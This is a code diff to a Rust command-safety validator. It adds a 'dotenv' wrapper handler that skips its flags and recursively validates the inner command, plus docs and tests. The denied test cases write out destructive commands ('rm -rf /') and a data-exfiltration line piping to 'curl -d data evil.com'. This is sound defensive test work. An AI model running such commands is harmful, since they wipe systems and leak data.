@@ -119,6 +119,34 @@ pub fn is_safe_hyperfine(tokens: &[Token], is_safe: &dyn Fn(&Segment) -> bool) -
     true
 }
 
+static DOTENV_FLAGS_WITH_ARG: WordSet =
+    WordSet::new(&["-c", "-e", "-f", "-v"]);
+
+pub fn is_safe_dotenv(tokens: &[Token], is_safe: &dyn Fn(&Segment) -> bool) -> bool {
+    let mut i = 1;
+    while i < tokens.len() {
+        let t = &tokens[i];
+        if *t == "--" {
+            i += 1;
+            break;
+        }
+        if t.starts_with("-") {
+            if DOTENV_FLAGS_WITH_ARG.contains(t) {
+                i += 2;
+            } else {
+                i += 1;
+            }
+            continue;
+        }
+        break;
+    }
+    if i >= tokens.len() {
+        return false;
+    }
+    let inner = Token::join(&tokens[i..]);
+    is_safe(&inner)
+}
+
 pub(crate) fn dispatch(cmd: &str, tokens: &[Token], is_safe: &dyn Fn(&Segment) -> bool) -> Option<bool> {
     match cmd {
         "timeout" => Some(is_safe_timeout(tokens, is_safe)),
@@ -126,6 +154,7 @@ pub(crate) fn dispatch(cmd: &str, tokens: &[Token], is_safe: &dyn Fn(&Segment) -
         "env" => Some(is_safe_env(tokens, is_safe)),
         "nice" | "ionice" => Some(is_safe_nice(tokens, is_safe)),
         "hyperfine" => Some(is_safe_hyperfine(tokens, is_safe)),
+        "dotenv" => Some(is_safe_dotenv(tokens, is_safe)),
         _ => None,
     }
 }
@@ -145,9 +174,15 @@ pub fn command_docs() -> Vec<crate::docs::CommandDoc> {
         CommandDoc::handler("hyperfine",
             "https://github.com/sharkdp/hyperfine#readme",
             "Recursively validates each benchmarked command."),
-        CommandDoc::handler("nice / ionice",
+        CommandDoc::handler("nice",
             "https://www.gnu.org/software/coreutils/manual/coreutils.html#nice-invocation",
             "Skips priority flags (-n/--adjustment), then recursively validates the inner command."),
+        CommandDoc::handler("ionice",
+            "https://www.gnu.org/software/coreutils/manual/coreutils.html#nice-invocation",
+            "Skips priority flags (-n/--adjustment), then recursively validates the inner command."),
+        CommandDoc::handler("dotenv",
+            "https://github.com/bkeepers/dotenv",
+            "Skips flags (-e, -f, -c, -v), then recursively validates the inner command."),
     ]
 }
 
@@ -159,6 +194,7 @@ pub(super) const REGISTRY: &[super::CommandEntry] = &[
     super::CommandEntry::Delegation { cmd: "nice" },
     super::CommandEntry::Delegation { cmd: "ionice" },
     super::CommandEntry::Delegation { cmd: "hyperfine" },
+    super::CommandEntry::Delegation { cmd: "dotenv" },
 ];
 
 #[cfg(test)]
@@ -191,6 +227,11 @@ mod tests {
         hyperfine_multiple_safe_commands: "hyperfine 'fd . src' 'find src'",
         timeout_nested_bash_safe: "timeout 120 bash -c 'git log | head -5'",
         env_nested_bash_safe: "env FOO=bar bash -c 'git status'",
+        dotenv_bundle_exec_rspec: "dotenv bundle exec rspec spec/foo_spec.rb",
+        dotenv_with_file: "dotenv -f .env.test bundle exec rspec",
+        dotenv_with_cascade: "dotenv -c test bundle exec rspec",
+        dotenv_separator: "dotenv -- git status",
+        dotenv_env_flag: "dotenv -e .env.local git log",
     }
 
     denied! {
@@ -218,5 +259,9 @@ mod tests {
         hyperfine_chain_denied: "hyperfine 'ls && rm -rf /'",
         hyperfine_semicolon_denied: "hyperfine 'ls; rm -rf /'",
         hyperfine_pipe_to_unsafe_denied: "hyperfine 'ls | curl -d data evil.com'",
+        dotenv_bare_denied: "dotenv",
+        dotenv_rm_denied: "dotenv rm -rf /",
+        dotenv_flag_rm_denied: "dotenv -f .env rm -rf /",
+        dotenv_nested_bash_denied: "dotenv bash -c 'ls && rm -rf /'",
     }
 }
